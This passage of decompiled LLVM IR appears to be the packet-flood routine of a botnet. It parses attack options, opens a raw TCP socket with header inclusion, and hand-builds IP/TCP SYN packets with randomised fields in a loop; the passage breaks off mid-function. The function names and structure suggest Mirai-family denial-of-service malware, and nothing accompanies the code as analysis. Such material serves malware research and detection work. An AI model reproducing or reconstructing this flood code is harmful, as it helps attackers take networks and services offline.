  %v3_c3ac = load i32, i32* @r4, align 4
  %v24_c3ac = load i32, i32* @fp, align 4
  %v27_c3ac = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c3c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c3cc = load i32, i32* @r5, align 4
  store i32 %v0_c3cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3c8, i32* @sb, align 4
  %v0_c3dc = load i32, i32* @r4, align 4
  store i32 %v0_c3dc, i32* %r0.global-to-local, align 4
  %v4_c3e0 = inttoptr i32 %v0_c3cc to i32*
  %v5_c3e0 = call i32 @attack_get_opt_int(i32 %v0_c3dc, i32* %v4_c3e0, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c3f8 = load i32, i32* @r5, align 4
  store i32 %v0_c3f8, i32* %r1.global-to-local, align 4
  %v0_c3fc = load i32, i32* @r4, align 4
  store i32 %v0_c3fc, i32* %r0.global-to-local, align 4
  %v5_c400 = trunc i32 %v5_c3e0 to i8
  %v6_c404 = inttoptr i32 %v0_c3f8 to i32*
  %v7_c404 = call i32 @attack_get_opt_int(i32 %v0_c3fc, i32* %v6_c404, i32 3, i32 65535)
  %v0_c408 = load i32, i32* @r5, align 4
  store i32 %v0_c408, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c418 = load i32, i32* @r4, align 4
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v5_c41c = inttoptr i32 %v0_c408 to i32*
  %v6_c41c = call i32 @attack_get_opt_int(i32 %v0_c418, i32* %v5_c41c, i32 4, i32 64)
  %v1_c424 = urem i32 %v6_c41c, 256
  %v0_c428 = load i32, i32* @r5, align 4
  store i32 %v0_c428, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c434 = load i32, i32* @r4, align 4
  store i32 %v0_c434, i32* %r0.global-to-local, align 4
  %v6_c43c = inttoptr i32 %v0_c428 to i32*
  %v7_c43c = call i32 @attack_get_opt_int(i32 %v0_c434, i32* %v6_c43c, i32 5, i32 1)
  %v1_c448 = urem i32 %v7_c43c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c454 = load i32, i32* @r5, align 4
  store i32 %v0_c454, i32* %r1.global-to-local, align 4
  %v0_c458 = load i32, i32* @r4, align 4
  store i32 %v0_c458, i32* %r0.global-to-local, align 4
  %v5_c460 = inttoptr i32 %v0_c454 to i32*
  %v6_c460 = call i32 @attack_get_opt_int(i32 %v0_c458, i32* %v5_c460, i32 6, i32 65535)
  %v0_c468 = load i32, i32* @r5, align 4
  store i32 %v0_c468, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c460, i32* %fp.global-to-local, align 4
  %v0_c478 = load i32, i32* @r4, align 4
  store i32 %v0_c478, i32* %r0.global-to-local, align 4
  %v4_c47c = inttoptr i32 %v0_c468 to i32*
  %v5_c47c = call i32 @attack_get_opt_int(i32 %v0_c478, i32* %v4_c47c, i32 7, i32 65535)
  %v0_c484 = load i32, i32* @r5, align 4
  store i32 %v0_c484, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c47c, i32* @r6, align 4
  %v0_c494 = load i32, i32* @r4, align 4
  store i32 %v0_c494, i32* %r0.global-to-local, align 4
  %v4_c498 = inttoptr i32 %v0_c484 to i32*
  %v5_c498 = call i32 @attack_get_opt_int(i32 %v0_c494, i32* %v4_c498, i32 17, i32 65535)
  %v0_c49c = load i32, i32* @r5, align 4
  store i32 %v0_c49c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4ac = load i32, i32* @r4, align 4
  store i32 %v0_c4ac, i32* %r0.global-to-local, align 4
  %v5_c4b0 = inttoptr i32 %v0_c49c to i32*
  %v6_c4b0 = call i32 @attack_get_opt_int(i32 %v0_c4ac, i32* %v5_c4b0, i32 18, i32 0)
  %v0_c4b4 = load i32, i32* @r5, align 4
  store i32 %v0_c4b4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4c4 = load i32, i32* @r4, align 4
  store i32 %v0_c4c4, i32* %r0.global-to-local, align 4
  %v5_c4c8 = inttoptr i32 %v0_c4b4 to i32*
  %v6_c4c8 = call i32 @attack_get_opt_int(i32 %v0_c4c4, i32* %v5_c4c8, i32 11, i32 0)
  %v0_c4cc = load i32, i32* @r5, align 4
  store i32 %v0_c4cc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4dc = load i32, i32* @r4, align 4
  store i32 %v0_c4dc, i32* %r0.global-to-local, align 4
  %v5_c4e0 = inttoptr i32 %v0_c4cc to i32*
  %v6_c4e0 = call i32 @attack_get_opt_int(i32 %v0_c4dc, i32* %v5_c4e0, i32 12, i32 0)
  %v0_c4e4 = load i32, i32* @r5, align 4
  store i32 %v0_c4e4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4f4 = load i32, i32* @r4, align 4
  store i32 %v0_c4f4, i32* %r0.global-to-local, align 4
  %v5_c4f8 = inttoptr i32 %v0_c4e4 to i32*
  %v6_c4f8 = call i32 @attack_get_opt_int(i32 %v0_c4f4, i32* %v5_c4f8, i32 13, i32 0)
  %v0_c4fc = load i32, i32* @r5, align 4
  store i32 %v0_c4fc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c50c = load i32, i32* @r4, align 4
  store i32 %v0_c50c, i32* %r0.global-to-local, align 4
  %v5_c510 = inttoptr i32 %v0_c4fc to i32*
  %v6_c510 = call i32 @attack_get_opt_int(i32 %v0_c50c, i32* %v5_c510, i32 14, i32 0)
  %v0_c514 = load i32, i32* @r5, align 4
  store i32 %v0_c514, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c524 = load i32, i32* @r4, align 4
  store i32 %v0_c524, i32* %r0.global-to-local, align 4
  %v5_c528 = inttoptr i32 %v0_c514 to i32*
  %v6_c528 = call i32 @attack_get_opt_int(i32 %v0_c524, i32* %v5_c528, i32 15, i32 1)
  %v0_c52c = load i32, i32* @r5, align 4
  store i32 %v0_c52c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c53c = load i32, i32* @r4, align 4
  store i32 %v0_c53c, i32* %r0.global-to-local, align 4
  %v5_c540 = inttoptr i32 %v0_c52c to i32*
  %v6_c540 = call i32 @attack_get_opt_int(i32 %v0_c53c, i32* %v5_c540, i32 16, i32 0)
  %v2_c54c = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_c54c, i32* %r3.global-to-local, align 4
  %v0_c550 = load i32, i32* @r5, align 4
  store i32 %v0_c550, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c558 = load i32, i32* @r4, align 4
  store i32 %v0_c558, i32* %r0.global-to-local, align 4
  %v5_c55c = inttoptr i32 %v0_c550 to i32*
  %v6_c55c = call i32 @attack_get_opt_ip(i32 %v0_c558, i32* %v5_c55c, i32 25, i32 %v2_c54c, i32 %v6_c540)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c570 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c570, i32* %r0.global-to-local, align 4
  %v7_c574 = icmp eq i32 %v3_c570, -1
  store i1 %v7_c574, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c570, i32* @sl, align 4
  br i1 %v7_c574, label %dec_label_pc_ca48, label %dec_label_pc_c580

dec_label_pc_c580:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c588 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c588, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c59c = call i32 @__GI_setsockopt(i32 %v3_c570, i32 0, i32 3, i32 %v6_c588, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c59c, i32* %r0.global-to-local, align 4
  %v7_c5a0 = icmp eq i32 %v5_c59c, -1
  store i1 %v7_c5a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c5a0, label %dec_label_pc_ca40, label %dec_label_pc_c5a8

dec_label_pc_c5a8:                                ; preds = %dec_label_pc_c580
  %v3_c5b0 = mul i32 %v7_c404, 65536
  store i32 %v3_c5b0, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c5b4 = mul i32 %v0_c5b4, 65536
  store i32 %v3_c5b4, i32* %r4.global-to-local, align 4
  %v0_c5b8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c4c8, i32* %r2.global-to-local, align 4
  %v3_c5c4 = urem i32 %v7_c404, 65536
  store i32 %v3_c5c4, i32* %r3.global-to-local, align 4
  %v3_c5c8 = urem i32 %v0_c5b4, 65536
  %v3_c5cc = urem i32 %v0_c5b8, 65536
  store i32 %v3_c5cc, i32* %r1.global-to-local, align 4
  %v0_c5d0 = load i32, i32* @r7, align 4
  %v2_c5d0 = icmp eq i32 %v0_c5d0, 0
  store i1 %v2_c5d0, i1* %cpsr_z.global-to-local, align 1
  %v1_c5e0 = urem i32 %v6_c4c8, 256
  store i32 %v1_c5e0, i32* @fp, align 4
  br i1 %v2_c5d0, label %dec_label_pc_c834.preheader, label %dec_label_pc_c5e8

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5a8
  %tmp52 = mul i32 %v5_c498, 256
  %v3_c600 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c404, 256
  %v3_c604 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c498, 256
  %v4_c60c = urem i32 %tmp54, 256
  %v5_c60c = or i32 %v4_c60c, %v3_c600
  store i32 %v5_c60c, i32* @lr, align 4
  %v1_c608 = mul i32 %v7_c404, 256
  %v4_c610 = and i32 %v1_c608, 65280
  %v5_c610 = or i32 %v4_c610, %v3_c604
  %tmp55 = mul i32 %v0_c5b4, 256
  %v3_c61c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c5b8, 256
  %v3_c620 = and i32 %tmp56, 65280
  %v1_c624 = urem i32 %v6_c4c8, 2
  %v1_c628 = urem i32 %v6_c4e0, 2
  %tmp57 = udiv i32 %v0_c5b4, 256
  %v4_c62c = urem i32 %tmp57, 256
  %v5_c62c = or i32 %v4_c62c, %v3_c61c
  store i32 %v5_c62c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c5b8, 256
  %v4_c630 = urem i32 %tmp58, 256
  %v5_c630 = or i32 %v4_c630, %v3_c620
  store i32 %v5_c630, i32* @r5, align 4
  %v1_c64c = urem i32 %v6_c4f8, 2
  store i32 %v1_c64c, i32* %r2.global-to-local, align 4
  %v1_c650 = urem i32 %v6_c510, 2
  store i32 %v1_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = urem i32 %v6_c528, 2
  store i32 %v1_c654, i32* %r0.global-to-local, align 4
  %v1_c658 = urem i32 %v6_c540, 2
  store i32 %v1_c658, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c610, 65536
  %v4_c6e0 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c628
  %v4_c744 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c64c
  %v4_c758 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c650
  %v4_c770 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c654
  %v3_c784 = and i32 %tmp64, 2
  %v1_c6d4 = trunc i32 %v6_c41c to i8
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %bb61, %dec_label_pc_c5e8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c680 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  %v3_c684 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c684, i32* %r2.global-to-local, align 4
  %v1_c688 = load i32, i32* @sb, align 4
  %v2_c688 = load i32, i32* @r4, align 4
  %v5_c688 = mul i32 %v2_c688, 4
  %v6_c688 = add i32 %v5_c688, %v1_c688
  %v7_c688 = inttoptr i32 %v6_c688 to i32*
  store i32 %v2_c680, i32* %v7_c688, align 4
  %v0_c68c = load i32, i32* %r2.global-to-local, align 4
  %v3_c68c = mul i32 %v0_c68c, 32
  store i32 %v3_c68c, i32* %r3.global-to-local, align 4
  %v0_c690 = load i32, i32* @sb, align 4
  %v4_c690 = mul i32 %v0_c68c, 4
  %v5_c690 = add i32 %v0_c690, %v4_c690
  %v6_c690 = inttoptr i32 %v5_c690 to i32*
  %v7_c690 = load i32, i32* %v6_c690, align 4
  store i32 %v7_c690, i32* %r4.global-to-local, align 4
  %v5_c694 = mul i32 %v0_c68c, 24
  store i32 %v5_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = load i32, i32* @r8, align 4
  %v2_c698 = add i32 %v1_c698, %v5_c694
  store i32 %v2_c698, i32* %r0.global-to-local, align 4
  %v1_c69c = inttoptr i32 %v7_c690 to i8*
  %v2_c69c = load i8, i8* %v1_c69c, align 1
  %tmp65 = urem i8 %v2_c69c, 16
  %v1_c6a0 = zext i8 %tmp65 to i32
  %v1_c6a4 = or i32 %v1_c6a0, 64
  store i32 %v1_c6a4, i32* %r3.global-to-local, align 4
  %v1_c6a8 = trunc i32 %v1_c6a4 to i8
  store i8 %v1_c6a8, i8* %v1_c69c, align 1
  %v0_c6ac = load i32, i32* %r4.global-to-local, align 4
  %v1_c6ac = inttoptr i32 %v0_c6ac to i8*
  %v2_c6ac = load i8, i8* %v1_c6ac, align 1
  %v1_c6b0 = and i8 %v2_c6ac, -16
  %v1_c6b4 = or i8 %v1_c6b0, 5
  store i32 %v1_c448, i32* %r3.global-to-local, align 4
  store i8 %v1_c6b4, i8* %v1_c6ac, align 1
  %v2_c6c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c6c4 = add i32 %v2_c6c4, 1
  %v4_c6c4 = inttoptr i32 %v3_c6c4 to i8*
  store i8 %v5_c400, i8* %v4_c6c4, align 1
  store i32 %v1_c424, i32* %r2.global-to-local, align 4
  %v0_c6cc = load i32, i32* %r3.global-to-local, align 4
  %v2_c6cc = icmp eq i32 %v0_c6cc, 0
  store i1 %v2_c6cc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c6d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c6d4 = add i32 %v2_c6d4, 8
  %v4_c6d4 = inttoptr i32 %v3_c6d4 to i8*
  store i8 %v1_c6d4, i8* %v4_c6d4, align 1
  %v0_c6d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c6d8 = trunc i32 %v0_c6d8 to i16
  %v2_c6d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c6d8 = add i32 %v2_c6d8, 2
  %v4_c6d8 = inttoptr i32 %v3_c6d8 to i16*
  store i16 %v1_c6d8, i16* %v4_c6d8, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c6e0, i32* %r1.global-to-local, align 4
  %v0_c6e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6e4, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c678
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c678, %bb
  %v2_c6e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c6e8 = add i32 %v2_c6e8, 9
  %v4_c6e8 = inttoptr i32 %v3_c6e8 to i8*
  store i8 6, i8* %v4_c6e8, align 1
  %v0_c6ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6ec, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c6ec = load i32, i32* %r2.global-to-local, align 4
  %v2_c6ec = trunc i32 %v1_c6ec to i16
  %v3_c6ec = load i32, i32* %r4.global-to-local, align 4
  %v4_c6ec = add i32 %v3_c6ec, 6
  %v5_c6ec = inttoptr i32 %v4_c6ec to i16*
  store i16 %v2_c6ec, i16* %v5_c6ec, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c55c, i32* %r2.global-to-local, align 4
  %v1_c6f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c6f4 = add i32 %v1_c6f4, 12
  %v3_c6f4 = inttoptr i32 %v2_c6f4 to i32*
  store i32 %v6_c55c, i32* %v3_c6f4, align 4
  %v0_c6f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_c6f8 = add i32 %v0_c6f8, 16
  %v2_c6f8 = inttoptr i32 %v1_c6f8 to i32*
  %v3_c6f8 = load i32, i32* %v2_c6f8, align 4
  store i32 %v3_c6f8, i32* %r3.global-to-local, align 4
  %v0_c6fc = load i32, i32* %r1.global-to-local, align 4
  %v1_c6fc = trunc i32 %v0_c6fc to i16
  %v2_c6fc = load i32, i32* %r4.global-to-local, align 4
  %v3_c6fc = add i32 %v2_c6fc, 4
  %v4_c6fc = inttoptr i32 %v3_c6fc to i16*
  store i16 %v1_c6fc, i16* %v4_c6fc, align 2
  %v0_c700 = load i32, i32* %r3.global-to-local, align 4
  %v1_c700 = load i32, i32* %r4.global-to-local, align 4
  %v2_c700 = add i32 %v1_c700, 16
  %v3_c700 = inttoptr i32 %v2_c700 to i32*
  store i32 %v0_c700, i32* %v3_c700, align 4
  %v0_c704 = load i32, i32* @r6, align 4
  %v1_c704 = trunc i32 %v0_c704 to i16
  %v2_c704 = load i32, i32* %r4.global-to-local, align 4
  %v3_c704 = add i32 %v2_c704, 20
  %v4_c704 = inttoptr i32 %v3_c704 to i16*
  store i16 %v1_c704, i16* %v4_c704, align 2
  %v0_c708 = load i32, i32* %r4.global-to-local, align 4
  %v1_c708 = add i32 %v0_c708, 20
  store i32 %v1_c708, i32* %r1.global-to-local, align 4
  %v1_c70c = add i32 %v0_c708, 32
  %v2_c70c = inttoptr i32 %v1_c70c to i8*
  %v3_c70c = load i8, i8* %v2_c70c, align 1
  %v4_c70c = zext i8 %v3_c70c to i32
  store i32 %v4_c70c, i32* %r3.global-to-local, align 4
  %v1_c710 = add i32 %v0_c708, 33
  %v2_c710 = inttoptr i32 %v1_c710 to i8*
  %v3_c710 = load i8, i8* %v2_c710, align 1
  %v4_c710 = zext i8 %v3_c710 to i32
  store i32 %v1_c624, i32* %r0.global-to-local, align 4
  %v1_c718 = urem i8 %v3_c70c, 16
  %v1_c71c = or i8 %v1_c718, -96
  %v1_c720 = and i32 %v4_c710, 223
  store i32 %v1_c720, i32* %r2.global-to-local, align 4
  store i8 %v1_c71c, i8* %v2_c70c, align 1
  %v0_c728 = load i32, i32* %r2.global-to-local, align 4
  %v1_c728 = load i32, i32* %r0.global-to-local, align 4
  %v4_c728 = mul i32 %v1_c728, 32
  %v5_c728 = or i32 %v4_c728, %v0_c728
  store i32 %v5_c728, i32* %r2.global-to-local, align 4
  store i32 %v5_c60c, i32* %r3.global-to-local, align 4
  %v1_c730 = trunc i32 %v5_c728 to i8
  %v2_c730 = load i32, i32* %r1.global-to-local, align 4
  %v3_c730 = add i32 %v2_c730, 13
  %v4_c730 = inttoptr i32 %v3_c730 to i8*
  store i8 %v1_c730, i8* %v4_c730, align 1
  %v0_c734 = load i32, i32* %r3.global-to-local, align 4
  %v1_c734 = load i32, i32* %r1.global-to-local, align 4
  %v2_c734 = add i32 %v1_c734, 4
  %v3_c734 = inttoptr i32 %v2_c734 to i32*
  store i32 %v0_c734, i32* %v3_c734, align 4
  %v0_c738 = load i32, i32* %r1.global-to-local, align 4
  %v1_c738 = add i32 %v0_c738, 13
  %v2_c738 = inttoptr i32 %v1_c738 to i8*
  %v3_c738 = load i8, i8* %v2_c738, align 1
  %v4_c738 = zext i8 %v3_c738 to i32
  store i32 %v1_c628, i32* %r0.global-to-local, align 4
  %v1_c740 = and i32 %v4_c738, 239
  %v5_c744 = or i32 %v1_c740, %v4_c744
  store i32 %v5_c744, i32* %r3.global-to-local, align 4
  %v1_c748 = trunc i32 %v5_c744 to i8
  store i8 %v1_c748, i8* %v2_c738, align 1
  %v0_c74c = load i32, i32* %r1.global-to-local, align 4
  %v1_c74c = add i32 %v0_c74c, 13
  %v2_c74c = inttoptr i32 %v1_c74c to i8*
  %v3_c74c = load i8, i8* %v2_c74c, align 1
  %v4_c74c = zext i8 %v3_c74c to i32
  store i32 %v1_c64c, i32* %r3.global-to-local, align 4
  %v1_c754 = and i32 %v4_c74c, 247
  %v5_c758 = or i32 %v1_c754, %v4_c758
  store i32 %v5_c758, i32* %r2.global-to-local, align 4
  %v0_c75c = load i32, i32* @r5, align 4
  %v1_c75c = trunc i32 %v0_c75c to i16
  %v3_c75c = add i32 %v0_c74c, 2
  %v4_c75c = inttoptr i32 %v3_c75c to i16*
  store i16 %v1_c75c, i16* %v4_c75c, align 2
  %v0_c760 = load i32, i32* %r2.global-to-local, align 4
  %v1_c760 = trunc i32 %v0_c760 to i8
  %v2_c760 = load i32, i32* %r1.global-to-local, align 4
  %v3_c760 = add i32 %v2_c760, 13
  %v4_c760 = inttoptr i32 %v3_c760 to i8*
  store i8 %v1_c760, i8* %v4_c760, align 1
  %v0_c764 = load i32, i32* %r1.global-to-local, align 4
  %v1_c764 = add i32 %v0_c764, 13
  %v2_c764 = inttoptr i32 %v1_c764 to i8*
  %v3_c764 = load i8, i8* %v2_c764, align 1
  %v4_c764 = zext i8 %v3_c764 to i32
  store i32 %v1_c650, i32* %r0.global-to-local, align 4
  %v1_c76c = and i32 %v4_c764, 251
  %v5_c770 = or i32 %v1_c76c, %v4_c770
  store i32 %v5_c770, i32* %r3.global-to-local, align 4
  %v1_c774 = trunc i32 %v5_c770 to i8
  store i8 %v1_c774, i8* %v2_c764, align 1
  %v0_c778 = load i32, i32* %r1.global-to-local, align 4
  %v1_c778 = add i32 %v0_c778, 13
  %v2_c778 = inttoptr i32 %v1_c778 to i8*
  %v3_c778 = load i8, i8* %v2_c778, align 1
  %v4_c778 = zext i8 %v3_c778 to i32
  store i32 %v1_c654, i32* %r3.global-to-local, align 4
  %v1_c780 = and i32 %v4_c778, 253
  %v4_c784 = or i32 %v1_c780, %v3_c784
  store i32 %v4_c784, i32* %r2.global-to-local, align 4
  %v1_c788 = trunc i32 %v4_c784 to i8
  store i8 %v1_c788, i8* %v2_c778, align 1
  %v0_c78c = load i32, i32* %r1.global-to-local, align 4
  %v1_c78c = add i32 %v0_c78c, 13
  %v2_c78c = inttoptr i32 %v1_c78c to i8*
  %v3_c78c = load i8, i8* %v2_c78c, align 1
  %v4_c78c = zext i8 %v3_c78c to i32
  store i32 %v1_c658, i32* %r0.global-to-local, align 4
  %v1_c794 = and i32 %v4_c78c, 254
  %v2_c798 = or i32 %v1_c794, %v1_c658
  store i32 %v2_c798, i32* %r3.global-to-local, align 4
  %v1_c79c = trunc i32 %v2_c798 to i8
  store i8 %v1_c79c, i8* %v2_c78c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c7a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7a8 = add i32 %v2_c7a8, 40
  %v4_c7a8 = inttoptr i32 %v3_c7a8 to i8*
  store i8 2, i8* %v4_c7a8, align 1
  %v0_c7ac = load i32, i32* %r2.global-to-local, align 4
  %v1_c7ac = trunc i32 %v0_c7ac to i8
  %v2_c7ac = load i32, i32* %r4.global-to-local, align 4
  %v3_c7ac = add i32 %v2_c7ac, 41
  %v4_c7ac = inttoptr i32 %v3_c7ac to i8*
  store i8 %v1_c7ac, i8* %v4_c7ac, align 1
  %v0_c7b0 = call i32 @rand_next()
  %v1_c7b4 = urem i32 %v0_c7b0, 16
  %v1_c7b8 = or i32 %v1_c7b4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c7b8, 256
  %v3_c7c4 = add nuw nsw i32 %tmp66, 2048
  %v5_c7cc = or i32 %v3_c7c4, 5
  %v1_c7d0 = trunc i32 %v5_c7cc to i16
  %v2_c7d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7d0 = add i32 %v2_c7d0, 42
  %v4_c7d0 = inttoptr i32 %v3_c7d0 to i16*
  store i16 %v1_c7d0, i16* %v4_c7d0, align 2
  %v2_c7d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7d8 = add i32 %v2_c7d8, 44
  %v4_c7d8 = inttoptr i32 %v3_c7d8 to i8*
  store i8 4, i8* %v4_c7d8, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c7e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7e8 = add i32 %v2_c7e8, 46
  %v4_c7e8 = inttoptr i32 %v3_c7e8 to i8*
  store i8 8, i8* %v4_c7e8, align 1
  %v0_c7ec = load i32, i32* %r2.global-to-local, align 4
  %v1_c7ec = trunc i32 %v0_c7ec to i8
  %v2_c7ec = load i32, i32* %r4.global-to-local, align 4
  %v3_c7ec = add i32 %v2_c7ec, 47
  %v4_c7ec = inttoptr i32 %v3_c7ec to i8*
  store i8 %v1_c7ec, i8* %v4_c7ec, align 1
  %v0_c7f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_c7f0 = trunc i32 %v0_c7f0 to i8
  %v2_c7f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7f0 = add i32 %v2_c7f0, 45
  %v4_c7f0 = inttoptr i32 %v3_c7f0 to i8*
  store i8 %v1_c7f0, i8* %v4_c7f0, align 1
  %v0_c7f4 = call i32 @rand_next()
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  %v2_c7fc = load i32, i32* %r4.global-to-local, align 4
  %v3_c7fc = add i32 %v2_c7fc, 59
  %v4_c7fc = inttoptr i32 %v3_c7fc to i8*
  store i8 6, i8* %v4_c7fc, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c80c = load i32, i32* %r4.global-to-local, align 4
  %v2_c80c = add i32 %v1_c80c, 48
  %v3_c80c = inttoptr i32 %v2_c80c to i32*
  store i32 %v0_c7f4, i32* %v3_c80c, align 4
  %v0_c810 = load i32, i32* %r3.global-to-local, align 4
  %v1_c810 = load i32, i32* %r4.global-to-local, align 4
  %v2_c810 = add i32 %v1_c810, 52
  %v3_c810 = inttoptr i32 %v2_c810 to i32*
  store i32 %v0_c810, i32* %v3_c810, align 4
  %v0_c814 = load i32, i32* %r2.global-to-local, align 4
  %v1_c814 = trunc i32 %v0_c814 to i8
  %v2_c814 = load i32, i32* %r4.global-to-local, align 4
  %v3_c814 = add i32 %v2_c814, 56
  %v4_c814 = inttoptr i32 %v3_c814 to i8*
  store i8 %v1_c814, i8* %v4_c814, align 1
  %v0_c818 = load i32, i32* %r1.global-to-local, align 4
  %v1_c818 = trunc i32 %v0_c818 to i8
  %v2_c818 = load i32, i32* %r4.global-to-local, align 4
  %v3_c818 = add i32 %v2_c818, 58
  %v4_c818 = inttoptr i32 %v3_c818 to i8*
  store i8 %v1_c818, i8* %v4_c818, align 1
  %v0_c81c = load i32, i32* %r1.global-to-local, align 4
  %v1_c81c = trunc i32 %v0_c81c to i8
  %v2_c81c = load i32, i32* %r4.global-to-local, align 4
  %v3_c81c = add i32 %v2_c81c, 57
  %v4_c81c = inttoptr i32 %v3_c81c to i8*
  store i8 %v1_c81c, i8* %v4_c81c, align 1
  %v3_c820 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c820, i32* %r3.global-to-local, align 4
  %v1_c824 = load i32, i32* %r2.global-to-local, align 4
  %v2_c824 = add i32 %v1_c824, %v3_c820
  store i32 %v2_c824, i32* @r4, align 4
  %v1_c828 = load i32, i32* @r7, align 4
  %v9_c828 = icmp eq i32 %v2_c824, %v1_c828
  store i1 %v9_c828, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c824, i32* %stack_var_-44, align 4
  %v5_c830 = icmp slt i32 %v2_c824, %v1_c828
  br i1 %v5_c830, label %dec_label_pc_c678, label %dec_label_pc_c834.preheader

dec_label_pc_c834.preheader:                      ; preds = %bb61, %dec_label_pc_c5a8
  %v0_c8386 = phi i32 [ 0, %dec_label_pc_c5a8 ], [ %v1_c828, %bb61 ]
